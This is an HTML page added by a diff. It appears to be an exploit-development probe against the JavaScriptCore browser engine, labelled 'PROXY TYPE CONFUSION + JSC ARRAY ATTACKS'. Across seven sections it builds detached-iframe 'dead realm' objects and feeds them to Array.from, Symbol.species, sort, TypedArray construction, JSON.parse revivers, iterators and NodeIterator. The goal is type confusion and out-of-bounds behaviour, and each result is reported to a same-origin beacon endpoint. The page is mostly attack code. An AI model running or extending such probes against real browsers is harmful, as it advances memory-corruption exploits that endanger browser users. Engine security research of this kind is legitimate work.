@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1254</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1254-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1254: PROXY TYPE CONFUSION + JSC ARRAY ATTACKS ===');
+B('START','P1254');
+
+function mkFrame(){
+  var ifr=document.createElement('iframe');
+  ifr.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  ifr.contentDocument.open();
+  ifr.contentDocument.write('<html><body></body></html>');
+  ifr.contentDocument.close();
+  return {win:ifr.contentWindow, doc:ifr.contentDocument, ifr:ifr};
+}
+</script>
+
+<!-- A: Array.from with Proxy reporting fake length -->
+<script>
+log('\n--- A: Proxy fake length in Array.from ---');
+(function(){
+  var f=mkFrame();
+  var handler=f.win.eval('({'+
+    'get:function(t,p){'+
+      'if(p==="length") return 0x10000;'+ // Fake huge length
+      'if(typeof p==="string"&&!isNaN(p)){'+
+        'var i=parseInt(p);'+
+        'if(i<10) return i*2;'+ // First 10 elements
+        'return undefined;'+ // Rest undefined
+      '}'+
+      'return t[p];'+
+    '}'+
+  '})');
+  document.body.removeChild(f.ifr); // Kill realm
+
+  var target=[1,2,3,4,5];
+  var proxy=new Proxy(target, handler);
+
+  // Array.from uses iterable protocol first, then length
+  try{
+    // Direct length access
+    B('A1','proxy_len='+proxy.length+'|real='+target.length);
+  }catch(e){B('A1','err:'+e.message.slice(0,40));}
+
+  // Array.from with the proxy
+  try{
+    var result=Array.from(proxy);
+    B('A2','from_len='+result.length+'|first5='+result.slice(0,5).join(',')+
+      '|last5='+result.slice(-5).join(',')+'|undef_count='+result.filter(function(x){return x===undefined;}).length);
+  }catch(e){B('A2','from_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Array.from with mapFn
+  try{
+    var mapped=Array.from({length:proxy.length}, function(v,i){return i<5?i*3:0;});
+    B('A3','mapped_len='+mapped.length+'|first='+mapped.slice(0,3).join(','));
+  }catch(e){B('A3','map_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Spread operator with proxy
+  try{
+    // This would call Symbol.iterator, not length
+    var spread=[].concat(proxy);
+    B('A4','concat_len='+spread.length);
+  }catch(e){B('A4','spread_err:'+e.name+':'+e.message.slice(0,40));}
+})();
+</script>
+
+<!-- B: Symbol.species through dead-realm Proxy -->
+<script>
+log('\n--- B: Species confusion ---');
+(function(){
+  var f=mkFrame();
+
+  // Create a constructor in iframe that returns a typed array instead of array
+  var evilSpecies=f.win.eval('(function EvilSpecies(len){'+
+    'this._len=len;'+
+    'this._data=new Float64Array(Math.min(len,100));'+ // Different backing store type!
+    'return this._data;'+ // Return typed array from constructor
+  '})');
+
+  document.body.removeChild(f.ifr);
+
+  // Create an array-like with dead-realm species
+  var arr=[1.1, 2.2, 3.3, 4.4, 5.5];
+  try{
+    // Override species on the array's constructor
+    arr.constructor={};
+    arr.constructor[Symbol.species]=evilSpecies;
+
+    // map() creates result via species — should call EvilSpecies(5)
+    var result=arr.map(function(x){return x*2;});
+    B('B1','map_type='+typeof result+'|isArray='+Array.isArray(result)+
+      '|isTa='+(result instanceof Float64Array)+'|len='+result.length+
+      '|val0='+result[0]+'|val4='+result[4]);
+  }catch(e){B('B1','map_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // filter with evil species
+  try{
+    var filtered=arr.filter(function(x){return x>2;});
+    B('B2','filter_type='+(filtered instanceof Float64Array)+'|len='+filtered.length);
+  }catch(e){B('B2','filter_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // slice with evil species
+  try{
+    var sliced=arr.slice(1,3);
+    B('B3','slice_type='+(sliced instanceof Float64Array)+'|len='+sliced.length+'|v0='+sliced[0]);
+  }catch(e){B('B3','slice_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // flat with evil species
+  try{
+    arr.push([6,7]);
+    var flatted=arr.flat();
+    B('B4','flat_type='+(flatted instanceof Float64Array)+'|len='+flatted.length);
+  }catch(e){B('B4','flat_err:'+e.name+':'+e.message.slice(0,40));}
+})();
+</script>
+
+<!-- C: Sort with adversarial comparator from dead realm -->
+<script>
+log('\n--- C: Adversarial sort comparator ---');
+(function(){
+  var f=mkFrame();
+
+  // Comparator that changes behavior after N calls
+  var cmpCode='var calls=0;(function cmp(a,b){'+
+    'calls++;'+
+    'if(calls>50) return -a;'+ // Inconsistent after 50 calls
+    'return a-b;'+
+  '})';
+  var cmp=f.win.eval(cmpCode);
+  document.body.removeChild(f.ifr);
+
+  // Sort with dead-realm comparator
+  var arr=[];
+  for(var i=0;i<100;i++) arr.push(Math.random()*1000|0);
+  var orig=arr.slice();
+
+  try{
+    arr.sort(cmp);
+    // Check if sort produced valid results
+    var sorted=true;
+    for(var i=1;i<arr.length;i++){
+      if(arr[i]<arr[i-1]){sorted=false;break;}
+    }
+    B('C1','sort_done|sorted='+sorted+'|len='+arr.length+'|orig_len='+orig.length);
+  }catch(e){B('C1','sort_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Sort with comparator that modifies the array during sort
+  var f2=mkFrame();
+  var evilCmp=f2.win.eval('(function(a,b){'+
+    'if(this&&this.length>50){this.length=10;}'+ // Shrink during sort
+    'return a-b;'+
+  '})');
+  document.body.removeChild(f2.ifr);
+
+  var arr2=[];
+  for(var i=0;i<100;i++) arr2.push(i);
+  try{
+    arr2.sort(evilCmp.bind(arr2));
+    B('C2','mutating_sort|len='+arr2.length);
+  }catch(e){B('C2','mut_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Sort with comparator that returns non-numeric values
+  var f3=mkFrame();
+  var weirdCmp=f3.win.eval('(function(a,b){'+
+    'var r=["NaN",undefined,null,{},true,Infinity,-Infinity,0,-0];'+
+    'return r[Math.floor(Math.random()*r.length)];'+
+  '})');
+  document.body.removeChild(f3.ifr);
+
+  var arr3=[5,3,1,4,2,8,6,7,9,0];
+  try{
+    arr3.sort(weirdCmp);
+    B('C3','weird_sort|len='+arr3.length+'|vals='+arr3.join(','));
+  }catch(e){B('C3','weird_err:'+e.name+':'+e.message.slice(0,40));}
+})();
+</script>
+
+<!-- D: Proxy-wrapped TypedArray with dead handler -->
+<script>
+log('\n--- D: Proxy TypedArray confusion ---');
+(function(){
+  var f=mkFrame();
+  var buf=new ArrayBuffer(64);
+  var u32=new Uint32Array(buf);
+  for(var i=0;i<u32.length;i++) u32[i]=i*0x11111111;
+
+  // Proxy that makes TypedArray report wrong length/type
+  var handler=f.win.eval('({'+
+    'get:function(t,p){'+
+      'if(p==="length") return t.length*4;'+ // 4x actual length
+      'if(p==="byteLength") return t.byteLength*2;'+ // 2x actual
+      'if(p==="BYTES_PER_ELEMENT") return 1;'+ // Claim byte elements
+      'if(p==="buffer") return t.buffer;'+ // Real buffer
+      'return t[p];'+
+    '}'+
+  '})');
+  document.body.removeChild(f.ifr);
+
+  var proxy=new Proxy(u32, handler);
+
+  B('D1','len='+proxy.length+'|realLen='+u32.length+
+    '|byteLen='+proxy.byteLength+'|realByteLen='+u32.byteLength+
+    '|bpe='+proxy.BYTES_PER_ELEMENT);
+
+  // Try to create a new TypedArray from the proxy
+  try{
+    var copy=new Uint8Array(proxy);
+    B('D2','u8_from_proxy|len='+copy.length+'|first4='+copy[0]+','+copy[1]+','+copy[2]+','+copy[3]);
+  }catch(e){B('D2','u8_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // TypedArray.from with proxy
+  try{
+    var fromProxy=Uint32Array.from(proxy);
+    B('D3','from_proxy|len='+fromProxy.length+'|v0=0x'+fromProxy[0].toString(16));
+  }catch(e){B('D3','from_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // DataView on proxy's buffer
+  try{
+    var dv=new DataView(proxy.buffer);
+    B('D4','dv_ok|byteLen='+dv.byteLength+'|v0=0x'+dv.getUint32(0).toString(16));
+  }catch(e){B('D4','dv_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // set() with proxy as source
+  try{
+    var dest=new Uint32Array(32); // Bigger than real, smaller than fake
+    dest.set(proxy);
+    B('D5','set_ok|dest_len='+dest.length+'|v0=0x'+dest[0].toString(16)+'|v15=0x'+dest[15].toString(16));
+  }catch(e){B('D5','set_err:'+e.name+':'+e.message.slice(0,40));}
+})();
+</script>
+
+<!-- E: JSON.parse with dead-realm reviver -->
+<script>
+log('\n--- E: JSON reviver + valueOf/toString ---');
+(function(){
+  var f=mkFrame();
+
+  // Reviver that replaces types
+  var reviver=f.win.eval('(function(key,val){'+
+    'if(typeof val==="number") return {n:val,__proto__:null};'+ // Numbers become objects
+    'if(typeof val==="string"&&val.length>3) return val.length;'+ // Long strings become numbers
+    'return val;'+
+  '})');
+
+  // valueOf/toString that confuse type coercion
+  var fakeNum=f.win.eval('({valueOf:function(){return 0xDEADBEEF;},toString:function(){return "42";}})');
+  var fakeStr=f.win.eval('({valueOf:function(){return 1337;},toString:function(){return "FAKE";}})');
+
+  document.body.removeChild(f.ifr);
+
+  // JSON.parse with dead reviver
+  try{
+    var parsed=JSON.parse('{"a":42,"b":"hello","c":[1,2,3],"d":"hi"}', reviver);
+    B('E1','parsed='+JSON.stringify(parsed));
+  }catch(e){B('E1','parse_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Type coercion with dead-realm valueOf/toString
+  try{
+    var numCoerce=fakeNum+1;
+    var strCoerce='prefix_'+fakeStr;
+    var eqCoerce=fakeNum==0xDEADBEEF;
+    B('E2','num='+(numCoerce>>>0).toString(16)+'|str='+strCoerce+'|eq='+eqCoerce);
+  }catch(e){B('E2','coerce_err:'+e.message.slice(0,40));}
+
+  // Use in comparison
+  try{
+    var arr=[3,1,fakeNum,2,fakeStr,4];
+    arr.sort();
+    B('E3','sort_with_fake='+arr.join(','));
+  }catch(e){B('E3','sort_err:'+e.message.slice(0,40));}
+
+  // Template literal with dead toString
+  try{
+    var template='result: '+fakeStr+' and '+fakeNum;
+    B('E4','template='+template);
+  }catch(e){B('E4','tmpl_err:'+e.message.slice(0,40));}
+})();
+</script>
+
+<!-- F: Iterator protocol from dead realm -->
+<script>
+log('\n--- F: Dead-realm iterator protocol ---');
+(function(){
+  var f=mkFrame();
+
+  // Create an iterable with dead-realm Symbol.iterator
+  var deadIterable=f.win.eval('({'+
+    '[Symbol.iterator]:function(){'+
+      'var i=0;'+
+      'return {'+
+        'next:function(){'+
+          'if(i>=10) return {done:true};'+
+          'return {value:i++*7, done:false};'+
+        '}'+
+      '};'+
+    '}'+
+  '})');
+
+  document.body.removeChild(f.ifr);
+
+  // for...of with dead iterator
+  try{
+    var vals=[];
+    for(var v of deadIterable) vals.push(v);
+    B('F1','for_of|count='+vals.length+'|vals='+vals.join(','));
+  }catch(e){B('F1','err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Array destructuring with dead iterator
+  try{
+    var [a,b,c,...rest]=deadIterable;
+    B('F2','destruct|a='+a+'|b='+b+'|c='+c+'|rest='+rest.join(','));
+  }catch(e){B('F2','err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Promise.all with dead iterable
+  try{
+    var promises=[];
+    for(var v of deadIterable) promises.push(Promise.resolve(v));
+    Promise.all(promises).then(function(results){
+      B('F3','promise_all='+results.join(','));
+    });
+  }catch(e){B('F3','err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Map/Set construction from dead iterator
+  try{
+    var entries=[];
+    for(var v of deadIterable) entries.push([v, 'val'+v]);
+    var map=new Map(entries);
+    B('F4','map_size='+map.size+'|has_0='+map.has(0)+'|get_7='+map.get(7));
+  }catch(e){B('F4','err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Generator-like dead iterator with throw/return
+  var f2=mkFrame();
+  var throwable=f2.win.eval('({'+
+    '[Symbol.iterator]:function(){'+
+      'var i=0;'+
+      'return {'+
+        'next:function(){return i>=5?{done:true}:{value:i++,done:false};},'+
+        'return:function(){return {done:true,value:"returned"};},'+
+        'throw:function(e){return {done:true,value:"caught:"+e};}'+
+      '};'+
+    '}'+
+  '})');
+  document.body.removeChild(f2.ifr);
+
+  try{
+    var it=throwable[Symbol.iterator]();
+    var v1=it.next();
+    var v2=it.next();
+    var ret=it.return('early');
+    B('F5','throwable|v1='+JSON.stringify(v1)+'|v2='+JSON.stringify(v2)+'|ret='+JSON.stringify(ret));
+  }catch(e){B('F5','err:'+e.message.slice(0,40));}
+})();
+</script>
+
+<!-- G: NodeIterator + dead filter + DOM mutation (exploit the P1252 B divergence) -->
+<script>
+log('\n--- G: NodeIterator mutation race ---');
+(function(){
+  var container=document.createElement('div');
+  container.id='G-cont';
+  for(var i=0;i<10;i++){
+    var s=document.createElement('span');
+    s.textContent='G'+i;
+    s.id='G'+i;
+    container.appendChild(s);
+  }
+  document.body.appendChild(container);
+
+  // Test: advance NodeIterator, detach filter realm, mutate, iterate
+  var f=mkFrame();
+  var filter=f.win.eval('(function(n){return 1;})');
+  var ni=document.createNodeIterator(container, 1, {acceptNode:filter});
+
+  // Advance to G3
+  for(var i=0;i<4;i++) ni.nextNode();
+  B('G1','advanced_4');
+
+  // Detach
+  document.body.removeChild(f.ifr);
+
+  // Mutate: remove the CURRENT reference node and its neighbors
+  document.getElementById('G3').remove();
+  document.getElementById('G4').remove();
+  B('G2','removed_G3_G4');
+
+  // Try to iterate forward
+  var forward=[];
+  try{
+    var n;
+    while(n=ni.nextNode()){
+      forward.push(n.id||n.textContent);
+      if(forward.length>15) break;
+    }
+    B('G3','forward='+forward.join(',')+' ('+forward.length+')');
+  }catch(e){B('G3','fwd_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Try previousNode
+  var backward=[];
+  try{
+    var n;
+    while(n=ni.previousNode()){
+      backward.push(n.id||n.textContent);
+      if(backward.length>15) break;
+    }
+    B('G4','backward='+backward.join(',')+' ('+backward.length+')');
+  }catch(e){B('G4','bwd_err:'+e.name+':'+e.message.slice(0,40));}
+
+  // Test 2: mutate DURING iteration with dead filter
+  var f2=mkFrame();
+  var filter2=f2.win.eval('(function(n){return 1;})');
+  var ni2=document.createNodeIterator(container, 1, {acceptNode:filter2});
+  document.body.removeChild(f2.ifr);
+
+  var mutResults=[];
+  try{
+    var n, count=0;
+    while(n=ni2.nextNode()){
+      mutResults.push(n.id||'?');
+      count++;
+      // Remove every other node DURING iteration
+      if(count%2===0 && n.nextSibling){
+        n.nextSibling.remove();
+      }
+      if(count>20) break;
+    }
+    B('G5','mut_during|visited='+mutResults.join(','));
+  }catch(e){B('G5','mut_err:'+e.name+':'+e.message.slice(0,40));}
+
+  container.remove();
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1254 COMPLETE ===');
+}, 5000);
+</script>
+
+</body>
+</html>
